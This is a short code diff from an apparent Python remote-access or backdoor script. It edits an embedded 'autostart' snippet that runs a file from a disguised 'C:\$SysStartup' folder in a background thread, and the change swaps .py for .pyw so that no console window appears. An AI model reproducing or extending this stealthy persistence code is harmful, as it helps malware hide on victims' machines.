@@ -18,7 +18,7 @@ ADDR = (HOST, PORT)
 # the script for autostart
 var = """import threading
 from subprocess import call
-def a0001(): call(["python", "C:\$SysStartup\pslib.py"], shell=True)
+def a0001(): call(["python", "C:\$SysStartup\pslib.pyw"], shell=True)
 a0001 = threading.Thread(target=a0001)
 a0001.start()
 
